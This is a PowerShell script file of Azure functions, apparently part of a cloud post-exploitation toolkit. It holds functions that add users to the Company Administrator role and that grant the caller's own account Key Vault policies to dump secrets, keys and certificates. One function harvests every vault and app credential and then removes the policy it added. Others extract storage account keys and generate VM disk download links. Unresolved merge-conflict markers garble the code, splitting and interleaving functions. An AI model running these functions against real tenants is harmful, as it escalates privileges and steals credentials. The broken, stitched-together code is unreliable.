    Add-AzureADRole -Username test@test.com -Role 'Company Administrator'
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$Username = $null,
    [Parameter(Mandatory=$false)][String]$UserId = $null,
    [Parameter(Mandatory=$false)][String]$RoleId = $null,
    [Parameter(Mandatory=$false)][String]$Role = $null)

    $Headers = Get-AzureGraphToken 
    If($Username)
    {
        If($Role)
        {
	        $rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
	        $roledata = $rolelist.value |  Where-Object {$_.displayName -eq $Role}
            $userdata = Get-AzADUser -UserPrincipalName $username
            $UsersId = $userdata.Id
	        $RolesId = $roledata.id
            $uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RolesId" + '/members/$ref'
$body = @"
{	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UsersId"
}
"@
	        $req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
            If($req -eq "")
            {
                Write-Host "Successfully added $Username to $Role" -ForegroundColor Green
            }
>>>>>>> Stashed changes
        }
        If($RoleID)
        {
	        $rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
            $userdata = Get-AzADUser -UserPrincipalName $username
            $UsersId = $userdata.Id
            $uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RoleId" + '/members/$ref'
$body = @"
{	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UsersId"
}
<<<<<<< Updated upstream

function Get-Roles
{
<# 
.SYNOPSIS
    Lists the roles of a specific user.

.PARAMETER 
    -User (john@contoso.com)

.EXAMPLE
    Get-Rolesr -User john@contoso.com
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$User = $null)
    
    If($User -eq "") 
    {
        Write-Host  "Requires a username in the format of 'user@domain.com'" -ForegroundColor Red
        Write-Host  "Usage: Get-Roles -User Test@domain.com" -ForegroundColor Red
=======
"@
	        $req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
            If($req -eq "")
            {
                Write-Host "Successfully added $Username to $RoleID" -ForegroundColor Green
            }
        }
>>>>>>> Stashed changes
    }
    If($UserId)
    {
        If($Role)
        {
	        $rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
	        $roledata = $rolelist.value |  Where-Object {$_.displayName -eq $Role}
	        $RolesId = $roledata.id
            $uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RolesId" + '/members/$ref'
$body = @"
{	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UserId"
}
<<<<<<< Updated upstream

function Get-RoleMembers  
{
<# 
.SYNOPSIS
    Gets the members of a role. Capitalization matters (i.e. reader vs Reader <---correct)

.PARAMETER 
    -Role

.EXAMPLE
    Get-RoleMembers Reader
    
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$Role = $null)

    if($Role -eq "")
    {
        Write-Host  "Requires a role" -ForegroundColor Red
        Write-Host  "Usage: Get-RoleMembers Reader" -ForegroundColor Red
=======
"@
	        $req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
            If($req -eq "")
            {
                Write-Host "Successfully added $UsedID to $Role"
            }
        }
        If($RoleID)
        {
	        $rolelist = Invoke-RestMethod -Headers $Headers -Method Get -ContentType 'application/json' -Uri 'https://graph.microsoft.com/v1.0/directoryRoles'
            $uri = 'https://graph.microsoft.com/v1.0/directoryRoles/' + "$RoleId" + '/members/$ref'
$body = @"
{	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UserId"
}
"@
	        $req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
            If($req -eq "")
            {
                Write-Host "Successfully added $UsedID to $RoleID"
            }
        }
>>>>>>> Stashed changes
    }
    If(!$Role -and $RoleId -and !$Username -and !$UserId)
    {
        Write-Host "Usage" -ForegroundColor Red
        Write-Host "Add-AzureADRole -Username test@test.com -Role 'Company Administrator'" -ForegroundColor Red
        Write-Host "Add-AzureADRole -UserId 1234567-4568-4579-dede-97709e94e300 -RoleId '4dda258a-4568-4579-abeb-07709e34e307'" -ForegroundColor Red
    }
}

function Show-AzureKeyVaultContent
{
<# 
.SYNOPSIS
    Lists all available content in a key vault

.PARAMETER 
    -VaultName (Key Vault Name)
	-All (All Key Vaults)

.EXAMPLE
    Show-AzureKeyVaultContent -Name VaultName
#>

    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$false,HelpMessage='Vault name')][String]$VaultName = $null,
	[Parameter(Mandatory=$false)][Switch]$All = $null)	
	
	$name = Get-AzContext	
	If($All)
	{
		$vaults = Get-AzKeyVault		
		ForEach($vault in $vaults)
		{
			$vaultsname = $vault.VaultName
			Set-AzKeyVaultAccessPolicy -VaultName $vaultsname -UserPrincipalName $name.Account -PermissionsToCertificates create,get,list,delete,import,update,recover,backup,restore -PermissionsToSecrets get,list,delete,recover,backup,restore -PermissionsToKeys create,get,list,delete,import,update,recover,backup,restore
			$Secrets = $Vault | Get-AzKeyVaultSecret
			$Keys = $Vault | Get-AzKeyVaultKey
			$Certificates = $Vault | Get-AzKeyVaultCertificate 
			$obj = New-Object -TypeName psobject	
            $obj | Add-Member -MemberType NoteProperty -Name VaultName -Value $vaultsname
			$obj | Add-Member -MemberType NoteProperty -Name SecretName -Value $Secrets.Name
			$obj | Add-Member -MemberType NoteProperty -Name SecretContentType -Value $Secrets.ContentType
			$obj | Add-Member -MemberType NoteProperty -Name CertificateName -Value $Certificates.Name
			$obj | Add-Member -MemberType NoteProperty -Name KeyName -Value $Keys.Name
			$obj | Add-Member -MemberType NoteProperty -Name KeyEnabled -Value $Keys.Enabled
			$obj | Add-Member -MemberType NoteProperty -Name KeyRecoveryLevel -Value $Keys.RecoveryLevel
            $obj
		}
	}
	If($VaultName)
	{			
		Set-AzKeyVaultAccessPolicy -VaultName $vaultname -UserPrincipalName $name.Account -PermissionsToCertificates create,get,list,delete,import,update,recover,backup,restore -PermissionsToSecrets get,list,delete,recover,backup,restore -PermissionsToKeys create,get,list,delete,import,update,recover,backup,restore
		$Secrets = $Vault | Get-AzKeyVaultSecret
		$Keys = $Vault | Get-AzKeyVaultKey
		$Certificates = $Vault | Get-AzKeyVaultCertificate 
		$obj = New-Object -TypeName psobject	
        $obj | Add-Member -MemberType NoteProperty -Name VaultName -Value $Vaultname
		$obj | Add-Member -MemberType NoteProperty -Name SecretName -Value $Secrets.Name
		$obj | Add-Member -MemberType NoteProperty -Name SecretContentType -Value $Secrets.ContentType
		$obj | Add-Member -MemberType NoteProperty -Name CertificateName -Value $Certificates.Name
		$obj | Add-Member -MemberType NoteProperty -Name KeyName -Value $Keys.Name
		$obj | Add-Member -MemberType NoteProperty -Name KeyEnabled -Value $Keys.Enabled
		$obj | Add-Member -MemberType NoteProperty -Name KeyRecoveryLevel -Value $Keys.RecoveryLevel
        $obj		
	}
	If(!$VaultName -and !$All)
	{
	Write-Host "Usage: Show-KeyVaultContent -Name VaultName" -ForegroundColor Red
	Write-Host "Usage: Show-KeyVaultContent -All" -ForegroundColor Red
	}
	
	
}

function Get-AzureKeyVaultContent
{
<# 
.SYNOPSIS
    Get the secrets and certificates from a specific Key Vault or all of them

.PARAMETER 
    -VaultName (Key Vault Name)
	-All (All Key Vaults)

.EXAMPLE
    Get-AzureKeyVaultContent -Name VaultName
#>
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$false,HelpMessage='Vault name')][String]$VaultName = $null,
	[Parameter(Mandatory=$false)][Switch]$All = $true)	
	
	$name = Get-AzContext
	if($All)
	{
		$vaults = Get-AzKeyVault		
		
		ForEach($vault in $vaults)
		{

			$vaultsname = $vault.VaultName
			Set-AzKeyVaultAccessPolicy -VaultName $vaultsname -UserPrincipalName $name.Account -PermissionsToCertificates create,get,list,delete,import,update,recover,backup,restore -PermissionsToSecrets get,list,delete,recover,backup,restore -PermissionsToKeys create,get,list,delete,import,update,recover,backup,restore
			$Secrets = Get-AzKeyVaultSecret -VaultName $vaultsname
			ForEach($Secret in $Secrets)
			{
				$Value = Get-AzKeyVaultSecret -VaultName $vaultsname -name $Secret.name

				$obj = New-Object -TypeName psobject	
				$obj | Add-Member -MemberType NoteProperty -Name SecretName -Value $Secret.Name
				$obj | Add-Member -MemberType NoteProperty -Name SecretValue -Value $Value.SecretValueText
				$obj | Add-Member -MemberType NoteProperty -Name ContentType -Value $Value.ContentType
				$obj
			}
		}
	}
	If($VaultName)
	{			
		Set-AzKeyVaultAccessPolicy -VaultName $vaultname -UserPrincipalName $name.Account -PermissionsToCertificates create,get,list,delete,import,update,recover,backup,restore -PermissionsToSecrets get,list,delete,recover,backup,restore -PermissionsToKeys create,get,list,delete,import,update,recover,backup,restore
		$Secrets = Get-AzKeyVaultSecret -VaultName $vaultname

		ForEach($Secret in $Secrets)
		{
			$Value = Get-AzKeyVaultSecret -VaultName $vaultname -name $Secret.name

			$obj = New-Object -TypeName psobject	
			$obj | Add-Member -MemberType NoteProperty -Name SecretName -Value $Secret.Name
			$obj | Add-Member -MemberType NoteProperty -Name SecretValue -Value $Value.SecretValueText
			$obj | Add-Member -MemberType NoteProperty -Name ContentType -Value $Value.ContentType
			$obj
		}
	}
	If(!$VaultName -and !$All)
	{
	Write-Host "Usage: Get-KeyVaultContents -Name VaultName" -ForegroundColor Red
	Write-Host "Usage: Get-KeyVaultContents -All" -ForegroundColor Red
	}
	
}

function Export-AzureKeyVaultContent
{
<# 
.SYNOPSIS
    Exports a Key as PEM or Certificate as PFX from the Key Vault

.PARAMETER 
    -VaultName (Key Vault Name)
	-Type (Key or Certificate)
	-Name (Name of Key or Certificate)
	-OutFilePath (Path of where to save the key or file

.EXAMPLE
   Export-AzureKeyVaultContent -VaultName VaultTest -Type Key -Name Testkey1234 -OutFilePath C:\Temp
#>
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$True,HelpMessage='Vault name')][String]$VaultName = $null,
	[Parameter(Mandatory=$True,HelpMessage='Key/Cert name')][String]$Name = $null,
	[Parameter(Mandatory=$True,HelpMessage='Where to save')][String]$OutFilePath = $null,
	[Parameter(Mandatory=$True,HelpMessage='Key or Certificate?')][String]$Type = $null)	

	$user = Get-AzContext
	Set-AzKeyVaultAccessPolicy -VaultName $vaultname -UserPrincipalName $user.Account -PermissionsToCertificates create,get,list,delete,import,update,recover,backup,restore -PermissionsToSecrets get,list,delete,recover,backup,restore -PermissionsToKeys create,get,list,delete,import,update,recover,backup,restore		
	
	If($Type -eq 'Key')
	{
		$Path = $OutFilePath + '\key.pem'
		$Export = Get-AzKeyVaultKey -VaultName $VaultName -KeyName $Name -OutFile $Path
		If($Export)
		{
			Write-Host "Successfully exported key to $path" -Foregroundcolor Green
		}
		else
		{
			Write-Host "Failed to export Key"
		}
	}
	If($Type -eq 'Certificate')
	{
		$Path = $OutFilePath + '\Cert.pfx'
		$cert = Get-AzKeyVaultCertificate -VaultName $Vaultname -Name $Name
		$secret = Get-AzKeyVaultSecret -VaultName $vaultName -Name $cert.Name
		$secretByte = [Convert]::FromBase64String($secret.SecretValueText)
		$x509Cert = new-object System.Security.Cryptography.X509Certificates.X509Certificate2
		$x509Cert.Import($secretByte, "", "Exportable,PersistKeySet")
		$type = [System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx
		$pfxFileByte = $x509Cert.Export($type, $password)
		[System.IO.File]::WriteAllBytes("$Path", $pfxFileByte)
		$test = ls C:\temp\cert.pfx
		If($test)
		{
			Write-Host "Successfully exported Certificate to $path" -Foregroundcolor Green
		}
		else
		{
			Write-Host "Failed to export Certificate"
		}
	}
	elseif($Type -ne 'Certificate' -and $Type -ne 'Key')
	{
		Write-Host "-Type must be a Certificate or Key!" -Foregroundcolor Red
		Write-Host "Usage: Export-KeyVaultContent -VaultName VaultTest -Type Key -Name Testkey1234 -OutFilePath C:\Temp" -Foregroundcolor Red
	}
}
    
function Show-AzureStorageContent
{
<#
.SYNOPSIS
    Lists all available storage containers, shares, and tables
.PARAMETER

    All- List all storage account contents
    StorageAccountName - Name of a specific account

.EXAMPLE
    Show-AzureStorageContent -All
    Show-AzureStorageContent -StorageAccountName TestAcct
#>
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$false)][String]$StorageAccountName = $null,
     [Parameter(Mandatory=$false)][Switch]$All = $null)
    
    If($All)
    {
        $accounts = Get-AzStorageAccount
        ForEach($account in $accounts)
        {
            $obj = New-Object -TypeName psobject
            $obj | Add-Member -MemberType NoteProperty -Name StorageAccountName -Value $account.StorageAccountName
            $obj | Add-Member -MemberType NoteProperty -Name ResourceGroup -Value $account.ResourceGroupname
            $Containers = Get-AzStorageAccount -Name $account.StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageContainer           
		    $obj | Add-Member -MemberType NoteProperty -Name ContainerName -Value $Containers.Name
            $obj | Add-Member -MemberType NoteProperty -Name ContainerPublicAccess -Value $Containers.PublicAccess
            $obj | Add-Member -MemberType NoteProperty -Name LastModified -Value $Containers.LastModified
            $Blobs = Get-AzStorageAccount -Name $account.StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageContainer | Get-AzStorageBlob
            $obj | Add-Member -MemberType NoteProperty -Name BlobName -Value $Blobs.Name
            $obj | Add-Member -MemberType NoteProperty -Name BlobSize -Value $Blobs.Length
            $obj | Add-Member -MemberType NoteProperty -Name BlobContentType -Value $Blobs.ContentType
            $obj | Add-Member -MemberType NoteProperty -Name BlobHomeContainer -Value $Blobs.Context.StorageA
            $Shares = Get-AzStorageAccount -Name $account.StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageShare
            $obj | Add-Member -MemberType NoteProperty -Name ShareName -Value $Shares.name
            $Files = Get-AzStorageAccount -Name $account.StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageShare | Get-AzStorageFile
            $obj | Add-Member -MemberType NoteProperty -Name FileName -Value $Files.Name
            $obj | Add-Member -MemberType NoteProperty -Name HomeShare -Value $Files.ShareDirectoryClient.ShareName
            $obj
        }
    }
    If($StorageAccountName)
    {
        $account = Get-AzStorageAccount -Name $StorageAccountName
        $obj = New-Object -TypeName psobject
        $obj | Add-Member -MemberType NoteProperty -Name StorageAccountName -Value $account.StorageAccountName
        $obj | Add-Member -MemberType NoteProperty -Name ResourceGroup -Value $account.ResourceGroupname
        $Containers = Get-AzStorageAccount -Name $StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageContainer           
		$obj | Add-Member -MemberType NoteProperty -Name ContainerName -Value $Containers.Name
        $obj | Add-Member -MemberType NoteProperty -Name ContainerPublicAccess -Value $Containers.PublicAccess
        $obj | Add-Member -MemberType NoteProperty -Name LastModified -Value $Containers.LastModified
        $Blobs = Get-AzStorageAccount -Name $StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageContainer | Get-AzStorageBlob
        $obj | Add-Member -MemberType NoteProperty -Name BlobName -Value $Blobs.Name
        $obj | Add-Member -MemberType NoteProperty -Name BlobSize -Value $Blobs.Length
        $obj | Add-Member -MemberType NoteProperty -Name BlobContentType -Value $Blobs.ContentType
        $obj | Add-Member -MemberType NoteProperty -Name BlobHomeContainer -Value $Blobs.Context.StorageA
        $Shares = Get-AzStorageAccount -Name $StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageShare
        $obj | Add-Member -MemberType NoteProperty -Name ShareName -Value $Shares.name
        $Files = Get-AzStorageAccount -Name $StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageShare | Get-AzStorageFile
        $obj | Add-Member -MemberType NoteProperty -Name FileName -Value $Files.Name
        $obj | Add-Member -MemberType NoteProperty -Name HomeShare -Value $Files.ShareDirectoryClient.ShareName
        $obj    
    } 
    If(!$All -and !$StorageAccountName)
    {
        Write-Host "Usage:" -ForegroundColor Red
        Write-Host "Show-AzureStorageContent -StorageAccountName TestAcct" -ForegroundColor Red
        Write-Host "Show-AzureStorageContent -All" -ForegroundColor Red
    }

}

<<<<<<< Updated upstream
function Get-ServicePrincipal
{
<#
.SYNOPSIS
    Returns all info on a service principal
.PARAMETER
    -Id (Id of SP)
.EXAMPLE
    Get-ServicePrincipal --id fdb54b57-a416-4115-8b21-81c73d2c2deb
#>
    
        [CmdletBinding()]
        Param(
        [Parameter(Mandatory=$false)][String]$Id = $null)
        
     if($Id -eq "")
     {
        Write-Host "Requires Service Principal Id" -ForegroundColor Red
        Write-Host "Usage example: Get-ServicePrincipal --id fdb54b57-a416-4115-8b21-81c73d2c2deb" -ForegroundColor Red
     }
     else
     {
        
        az ad sp show --id $Id
     }
}

function Get-Apps
=======
function Get-AzureStorageContent
>>>>>>> Stashed changes
{
<#
.SYNOPSIS
    Gathers a file from a specific blob or File Share

<<<<<<< Updated upstream
}

function Get-AppPermissions
{
<#
.SYNOPSIS
    Returns the permissions of an app
.PARAMETER
    -Id 
.EXAMPLE
    Get-AppPermissions -Id fdb54b57-a416-4115-8b21-81c73d2c2deb
#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$Id = $null)

     if($Id -eq "")
     {
        Write-Host "Requires Application Id" -ForegroundColor Red
        Write-Host "Usage example: Get-AppPermissions --id fdb54b57-a416-4115-8b21-81c73d2c2deb" -ForegroundColor Red
     }
     else
     {

        az ad app permission list --id $Id
     }
}

function Get-AppSecrets
{
<#
.SYNOPSIS
    Returns the application passwords or certificate credentials
.PARAMETER
    Name of App
.EXAMPLE
    Get-AppSecrets
#>
        [CmdletBinding()]
         Param(
         [Parameter(Mandatory=$false)][String]$Id = $null)
         if($Id -eq "")
         {
            Write-Host "Requires Application Id" -ForegroundColor Red
            Write-Host "Usage example: Get-AppSecrets --id fdb54b57-a416-4115-8b21-81c73d2c2deb" -ForegroundColor Red
         }
         else
         {

            az ad app credential list --id $Id
         }
}

function Get-AllAppSecrets
{
<#
.SYNOPSIS
    Returns all application passwords or certificate credentials (If accessible)
#>

    $ErrorActionPreference = "SilentlyContinue"
    $ids=az ad app list --query='[].{id:objectId}' -o tsv
    ForEach ($id in $ids){
                 az ad app credential list --id $id | ConvertFrom-Json
                    }
        
}

function Get-AllSecrets 
{
<# 
.SYNOPSIS
    Gets ALL the secrets from all Key Vaults and applications. If the logged in user cannot access a key vault or application, it ignores the error and trys the other ones. Errors are suppressed.

#>
    Write-Host "Gathering all keys from key vaults, this may take a moment"
    $vaults = az keyvault list --query '[].name' -o tsv
    $User = az ad signed-in-user show --query '[userPrincipalName]' -o tsv
    ForEach ($vault in $vaults)
    {
		$access = az keyvault set-policy --name $vault --upn $User --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
            if(!$access)
            {
               Write-Host "Couldn't change permissions on the Key Vault. Are you Global Contributor?"
               continue
            }
        $ids = az keyvault secret list --vault-name $vault --query '[].id' -o tsv
		$kids = az keyvault key list --vault-name $vault --query '[].id' -o tsv
		$cids = az keyvault certificate list --vault-name $vault --query '[].id' -o tsv
		ForEach ($i in $ids)
		{
			Write-Host "Vault: " $i
			az keyvault secret show --id $i -o table
			Write-Host ""
		}
		ForEach ($kid in $kids)
		{
			Write-Host "Vault: " $kid
			az keyvault secret show --id $kid -o table
			Write-Host ""
		}
		ForEach ($cid in $cids)
		{
			Write-Host "Vault: " $cid
			az keyvault secret show --id $cid -o table
			Write-Host ""
		}
		$removeaccess = az keyvault delete-policy --name $vault --upn $User
    }
    Write-Host ""
    Write-Host "Gathering all secrets from applications, this may take a moment"    
    $ids=az ad app list --query='[].{id:objectId}' -o tsv
    ForEach ($id in $ids){
                 az ad app credential list --id $id | ConvertFrom-Json
                    } 
    Write-Host ""
    Write-Host "Listing Automation Account Credentials. Unforunately passwords are abstraced :("
    $Data = Get-AzAutomationAccount
    $RG = $Data.ResourceGroupName
    $AA = $Data.AutomationAccountName
    Get-AzAutomationCredential -AutomationAccountName $AA -ResourceGroupName $RG

}

function Get-WebApps
{
<#
.SNYOPSIS 
    Gets running webapps
#>
    az webapp list --query "[?state=='Running']"
}

function Get-WebAppDetails
{
<#
.SYNOPSIS 
    Gets running webapps details
.PARAMETER
    -Name (of webapp)
.EXAMPLE
    Get-WebAppDetails WebAppName
#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$Name = $null)

         if($Name -eq "")
         {
            Write-Host "Requires WebApp Name" -ForegroundColor Red
            Write-Host "Usage example: Get-WebAppDetails -Name WebAppName" -ForegroundColor Red
         }
         else
         {
        
             az webapp show --name $name
         }
}

function Get-StorageAccounts
{
<#
.SYNOPSIS 
    Gets storage blobs 
#>
    az storage account list --query '[].{Name:name,URL:primaryEndpoints.blob}' -o table
}

function Get-StorageContents
{
<#
.SYNOPSIS 
    Gets the contents of a storage container or file share. OAuth is not support to access file shares via cmdlets, so you must have access to the Storage Account's key.
.PARAMETER
    -ResourceGroup
    -StorageAccount (Name of Storage account. Try Get-StorageAccounts for a list.)
    -File (Gets the contents of a specified file. If file is in a path, include the full path. Optional)
    -NoDelete (Doesn't delete the file after it's downloaded. Optional)
.EXAMPLE
    Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup
    Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File secret.txt -NoDelete
    Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File /path/to/secret.txt
    
#>
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$false)][String]$ResourceGroup = $null,
     [Parameter(Mandatory=$false)][String]$File = $null,
     [Parameter(Mandatory=$false)][Switch]$NoDelete = $null,
     [Parameter(Mandatory=$false)][String]$StorageAccount = $null)

     If($ResourceGroup -eq "")
     {
            Write-Host "Requires Resource Group name" -ForegroundColor Red
            Write-Host "Usage example: Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File secret.txt -NoDelete" -ForegroundColor Red
            Write-Host "               Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File /path/to/secret.txt" -ForegroundColor 
            Write-Host "               Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup" -ForegroundColor Red

     }
     elseif($StorageAccount -eq "")
     {
            Write-Host "Requires Storage Account name" -ForegroundColor Red
            Write-Host "Usage example: Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File secret.txt -NoDelete" -ForegroundColor Red
            Write-Host "               Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File /path/to/secret.txt" -ForegroundColor 
            Write-Host "               Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup" -ForegroundColor Red
     }
     else
     {
     
         $keys = az storage account keys list -g $ResourceGroup -n $StorageAccount --query '[].{key:value}' -o tsv
         $split = $keys.Split([Environment]::NewLine)
         $key = $split[0]
         $Context = New-AzStorageContext -StorageAccountName $StorageAccount -StorageAccountKey $key
         $Things = Get-AzStorageShare -Context $Context
         $Shares = $Things.Name

         Foreach($Share in $Shares)
         {
 
           if($File)
           {
             $Splitted = $File.Split("/")
             $Filename = $Splitted[-1]
             cat $Filename
             if($NoDelete -eq $true)
             {
                Get-AzStorageFileContent -Path $File -ShareName $Share -Context $Context
                cat $Filename
             }
             else
             {
                Get-AzStorageFileContent -Path $File -ShareName $Share -Context $Context
                cat $Filename
                rm $Filename
             }  
           }
           else
           {
                Write-Host "Enumerating $Share"   
                Write-Host "------------------"  
                Get-AzStorageFile -ShareName $Share -Context $Context
           }
         }
     }
}

function Upload-StorageContent
{
<#
.SYNOPSIS 
    Uploads a supplied file to a storage share.
.PARAMETER
    
    -StorageAccount (Name of Storage account. Try Get-StorageAccounts for a list.)
    -File (Gets the contents of a specified file. If file is in a path, include the full path. Optional)
    -Share (Share name to upload to)
.EXAMPLE
    
    Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt
    
    
#>
=======
.PARAMETER
    Share - Name of the share the file is located in 
    Path - Path of the file in the target share
    Blob - Name of the blob the file is located in 
    StorageAccountName - Name of a specific account
    ResourceGroup - The RG the Storage account is located in
    ContainerName - Name of the Container the file is located in
    
.EXAMPLE
    Get-AzureStorageContent
    Get-AzureStorageContent -StorageAccountName TestAcct -Type Container 
#>
>>>>>>> Stashed changes
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$true)][String]$StorageAccountName = $null,
     [Parameter(Mandatory=$true)][String]$ResourceGroup = $null,
     [Parameter(Mandatory=$false)][String]$Share = $null,
<<<<<<< Updated upstream
     [Parameter(Mandatory=$false)][String]$ResourceGroup = $null,
     [Parameter(Mandatory=$false)][String]$StorageAccount = $null)
     If($StorageAccount -eq "")
     {
            Write-Host "Requires Storage account name" -ForegroundColor Red
            Write-Host "Usage Example: Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt" -ForegroundColor Red
     }
     elseif($Share -eq "")
     {
            Write-Host "Requires Share name" -ForegroundColor Red
            Write-Host "Usage Example: Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt" -ForegroundColor Red
     }
     elseif($File -eq "")
     {
            Write-Host "Requires File name" -ForegroundColor Red
            Write-Host "Usage Example: Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt" -ForegroundColor Red
     }
     elseif($ResourceGroup -eq "")
     {
            Write-Host "Requires Resource Group name" -ForegroundColor Red
            Write-Host "Usage Example: Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt" -ForegroundColor Red
     }
     else
     {
         $keys = az storage account keys list -g $ResourceGroup -n $StorageAccount --query '[].{key:value}' -o tsv
         $split = $keys.Split([Environment]::NewLine)
         $key = $split[0]
         az storage file upload -s $Share --source $File --account-name $StorageAccount --account-key $key
     }
}

function Get-StorageAccountKeys
{
<#
.SYNOPSIS 
    Gets the account keys for a storage account
.PARAMETER
    -group
    -account 
    -kerb (optional, use if kerberos keys are suspected)
.EXAMPLE
    Get-StorageAccountKeys -ResourceGroup MyGroup -Account StorageAccountName -kerb
    
#>
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$false)][String]$ResourceGroup = $null,
     [Parameter(Mandatory=$false)][String]$Account = $null,
     [Parameter(Mandatory=$false)][Switch]$kerb = $null)
     if($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Get-StorageAccountKeys -ResourceGroup MyGroup -Account StorageAccountName -kerb " -ForegroundColor Red

     }
     elseif($Account -eq "")
     {
        Write-Host "Requires Storage account name" -ForegroundColor Red
        Write-Host "Usage: Get-StorageAccountKeys -ResourceGroup MyGroup -Account StorageAccountName -kerb " -ForegroundColor Red
     }
     else
     {
            if($kerb)
             {
             az storage account keys list -g $ResourceGroup -n $Account --expand-key-type kerb | ConvertFrom-Json
             }
             else
             {
             az storage account keys list -g $ResourceGroup -n $Account | ConvertFrom-Json
             }
     }
}

function Get-AvailableVMDisks
{
<#
.SYNOPSIS 
    Lists the VM disks available.      
#>

 az disk list --query '[].{Name:name,Size:diskSizeGb,Encryption:encryption,OS:osType,Creation:timeCreated,Id:uniqueId}' -o table

}

function Get-VMDisk
=======
     [Parameter(Mandatory=$false)][String]$Path = $null,
     [Parameter(Mandatory=$false)][String]$Blob = $null,
     [Parameter(Mandatory=$false)][String]$ContainerName = $null)
    
    If($ContainerName -and $Blob)
    {
        Get-AzStorageAccount -Name $StorageAccountName -ResourceGroupName $ResourceGroup | Get-AzStorageBlobContent -Container $ContainerName -Blob $Blob
    }
    If($Share -and $Path)
    {

       Get-AzStorageAccount -Name $StorageAccountName -ResourceGroupName $ResourceGroup | Get-AzStorageFileContent -ShareName $Share -Path $Path
    }
}

function Get-AzureVMDisk
>>>>>>> Stashed changes
{
<#
.SYNOPSIS 
    Generates a link to download a Virtual Machiche's disk. The link is only available for 24 hours.
.PARAMETER
    -DiskName

.EXAMPLE   
    Get-AzureVMDisk -DiskName AzureWin10_OsDisk_1_c2c7da5a0838404c84a70d6ec097ebf5     
#>
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$true)][String]$DiskName = $null)

    $Disk = Get-AzDisk -Name $DiskName
    $URI = Grant-AzDiskAccess -ResourceGroupName $Disk.ResourceGroupName -DiskName $DiskName -Access Read -DurationInSecond 86400
    If($URI)
    {
        Write-Host "Successfully got a link. Link is active for 24 Hours" -ForegroundColor Yellow
        $URI
    }   
}

function Get-AzureRunbookContent
{
 <#
.SYNOPSIS
    Gets a specific Runbook and displays its contents. 

.PARAMETER
    -Runbook (Name of Runbook)
    -All 
    -OutFilePath (Where to save Runbook)

.EXAMPLE
    Get-AzureRunbookContent -Runbook Runbooktest -OutFilePath 'C:\temp'
    Get-AzureRunbookContent -All -OutFilePath 'C:\temp

#>
<<<<<<< Updated upstream
        [CmdletBinding()]
        Param(
        [Parameter(Mandatory=$false)][String]$VM = $null,
        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)

     if($VM -eq "")
     {
        Write-Host "Requires VM name" -ForegroundColor Red
        Write-Host "Usage: Restart-VM -VM Example2016R2 -ResourceGroup Test_RG" -ForegroundColor Red

     }
     elseif($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Restart-VM -VM Example2016R2 -ResourceGroup Test_RG" -ForegroundColor Red
     }
     else
     {

        az vm restart -n $VM -g $ResourceGroup
     }
}

function Get-AutomationCredentials 
{
 <#
.SYNOPSIS
    Gets the credentials from any Automation Accounts
.PARAMETER
    -AutomationAccount (Name of Automation account)
    -ResourceGroup (Resource group it's located in)
.EXAMPLE
    Get-AutomationCredentials -AutomationAccount Test-Account -ResourceGroup Test_RG
